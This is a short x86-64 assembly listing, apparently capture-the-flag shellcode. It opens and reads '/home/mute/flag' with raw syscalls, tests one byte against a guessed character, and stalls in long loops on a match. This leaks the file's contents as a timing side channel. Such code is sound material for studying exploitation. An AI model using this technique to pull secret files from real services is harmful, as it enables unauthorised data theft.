section .text
    global _start

_start:
mov r8, 0x67616c662f6574
push r8
mov r8, 0x756d2f656d6f682f
push r8

; syscall open file
mov rdi, rsp ; pop path value
xor rax, rax
add al, 2
xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax
xor rdx, rdx
mov dx, 0xfff; size to read
xor rax, rax
syscall
  
cmp byte [rsi + 1], 0x69
jne exit

mov ecx,0
loop1:

inc ecx
cmp ecx, 0xffffffff
jne loop1

mov ecx,0
loop2:

inc ecx
cmp ecx, 0xffffffff
jne loop2

; syscall exit
exit:
xor rax, rax
add al, 60
syscall
